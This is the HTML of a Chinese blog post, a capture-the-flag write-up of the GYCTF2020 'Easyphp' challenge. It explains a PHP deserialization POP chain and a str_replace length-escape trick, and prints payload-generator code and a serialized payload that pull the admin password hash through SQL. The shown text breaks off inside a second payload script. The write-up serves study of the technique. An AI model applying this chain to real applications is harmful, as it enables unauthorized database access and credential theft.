@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+
+  <meta name="description" content="GYCTF 2020的BabyPHP（题目上错名字了）。 开题让登陆，随手试了一下www.zip发现还真有源码。。。 index.php没啥，限制后缀名为.php，LFI没用处。login.php Ban了一堆关键字 123456789if(isset($_POST[&amp;#x27;username&amp;#x27;]))&amp;#123;if(preg_match(&quot;&#x2F;union|select|d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ刷题-Web-GYCTF2020-Easyphp">
+<meta property="og:url" content="http://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/index.html">
+<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
+<meta property="og:description" content="GYCTF 2020的BabyPHP（题目上错名字了）。 开题让登陆，随手试了一下www.zip发现还真有源码。。。 index.php没啥，限制后缀名为.php，LFI没用处。login.php Ban了一堆关键字 123456789if(isset($_POST[&amp;#x27;username&amp;#x27;]))&amp;#123;if(preg_match(&quot;&#x2F;union|select|d">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-03-04T02:36:16.000Z">
+<meta property="article:modified_time" content="2020-03-05T07:02:15.790Z">
+<meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="Unserialize">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUOJ刷题-Web-GYCTF2020-Easyphp | Tiaonmmn's Littile House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="\assets\css\APlayer.min.css" class="aplayer-style-marker">
+<script src="\assets\js\APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="\assets\js\Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Tiaonmmn's Littile House</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
+      src="/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUOJ刷题-Web-GYCTF2020-Easyphp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-03-04 10:36:16" itemprop="dateCreated datePublished" datetime="2020-03-04T10:36:16+08:00">2020-03-04</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-03-05 15:02:15" itemprop="dateModified" datetime="2020-03-05T15:02:15+08:00">2020-03-05</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>10 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>GYCTF 2020的BabyPHP（题目上错名字了）。</p>
+<p>开题让登陆，随手试了一下www.zip发现还真有源码。。。</p>
+<p>index.php没啥，限制后缀名为.php，LFI没用处。login.php Ban了一堆关键字 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Damn you, hacker!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$user-&gt;login();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>login()函数来自lib.php。update.php里实例化了一个User()类，并update()。如果$_SESSION['login']===1就输出flag。</p>
+<div class="note warning"><p>一个大坑在于，update.php里判断没有登录后会继续执行$user()-&gt;update()，开始的时候没注意到这点，导致一直在想如何利用login.php传参。。。</p>
+</div>
+<p>本题重点就是lib.php了。User类的login()从POST获取username和password后执行查询，返回结果就分配SESSION。没太多搞头，但是update()里出现了unserialize()，就很有意思了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=$age,nickname=$nickname where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先反序列化getNewInfo()返回值，又调用了UpdateHelper()。getNewInfo()代码如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 从POST获取age和nickname，返回safe()处理后的Info()序列化结果。safe()简单的将一堆关键字替换成'hacker'，问题很大，反序列化结果记录了每个字段的长度，强行替换会造成额外读取，我们就可以控制了。 Info类代码如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 很简单的赋值而已，当我们调用一个不存在的方法时会调用CtrlCase-&gt;login()，只有dbCtrl有login()方法还需要一个参数。 UpdateHelper类的代码如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> UpdateHelper使用<span class="math inline">\(newInfo和\)</span>sql构造，而在销毁时又会显示<span class="math inline">\(sql的值。正常登录后\)</span>newInfo应该为admin用户的ID，<span class="math inline">\(sql应该是Info类，所以\)</span>this-&gt;sql是个空。</p>
+<p>User类还有个__destruct方法，但是没什么卵用，file_get_contents()的结果没有输出，是个干扰用的。</p>
+<p>我们的目标，现在看来就剩下一个了，通过某种方法得到admin的密码，登录得到flag。而要得到flag，很明显只有通过SQL。Info类的__call方法很明显要我们调用dbCtrl的login()方法，让我们任意执行SQL语句。得到admin用户的SQL语句不难写<code>select password,username from user where username=?</code>，因为login()返回的是idResult，第一个结果。Info的__call如何别触发？回过头看User类，update()函数用到了Info类，UpdateHelper也用到了，但是这些都没有涉及到方法的调用，然后我们就看到了__toString()方法： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> nickname哪来的？unserialize(getNewInfo())得到的，如果nickname是Info类，nickname-&gt;update就会触发Info的__call。__toString()需要一个输出字符串的地方才会被调用，而我们还有一个UpdateHelper的__destruct()，会echo <span class="math inline">\(this-&gt;sql，而在User类中UpdateHelper的调用中\)</span>Info会被赋值成$this-&gt;sql。</p>
+<p>整理一下POP链，首先是new UpdateHelper()，调用__destruct()，转向new User()的__toString()，调用nickname-&gt;update()，转向new Info()的__call，最终转向new dbCtrl()带出admin的密码。如图所示： <div class="mermaid">
+graph LR
+
+id1(&quot;UpdateHelper()&quot;) --&gt;|&quot;UpdateHelper-&gt;__destruct()&quot;| id2(&quot;User()&quot;)
+
+id2 --&gt;|&quot;User-&gt;__toString()&quot;| id3(&quot;User-&gt;nickname&quot;)
+
+id3 --&gt;|&quot;User-&gt;nickname-&gt;update()&quot;| id4(&quot;Info()&quot;)
+
+id4 --&gt;|&quot;Info-&gt;__call&quot;| id5(&quot;dbCtrl()&quot;)
+
+id5 --&gt;|&quot;SQL查询&quot;| id6(&quot;admin&#39;s password MD5&quot;)
+
+</div> 写Payload： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age, $nickname</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo, $sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $newInfo = unserialize($newInfo);</span><br><span class="line">        $upDate = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$info = <span class="keyword">new</span> Info(<span class="string">&quot;23333&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">$updatehelper = <span class="keyword">new</span> UpdateHelper(<span class="string">&quot;233333&quot;</span>, <span class="string">&quot;23333333&quot;</span>);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase = $db;</span><br><span class="line">$user-&gt;nickname = $info;</span><br><span class="line">$user-&gt;age = <span class="string">&quot;select password,id from username where username=?&quot;</span>;</span><br><span class="line">$updatehelper-&gt;sql=$user;</span><br><span class="line"><span class="keyword">echo</span> serialize($updatehelper);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>结果为<code>O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:49:"select password,id from username where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";s:5:"23333";s:8:"nickname";s:8:"Tiaonmmn";s:8:"CtrlCase";O:6:"dbCtrl":8:&#123;s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:7:"nu1lctf";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125;</code>。这个反序列化出来的是UpdateHelper类，而我们的输入点是getNewInfo()引入的Info类。怎么样能够把UpdateHelper类放到Info类中？很简单，我们布置好的UpdateHelper类在什么时候才发挥作用？调用__destruct()的时候，在正常调用User()-&gt;update()的时候Info-&gt;CtrlCase没有任何意义。所以，如果我们把Info-&gt;CtrlCase设置成UpdateHelper类怎么样？unserialize()结束后由于我们没有用到CtrlCase，所以会执行__destruct，完成我们想要的操作。 刚才的Payload应该再加两行： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span 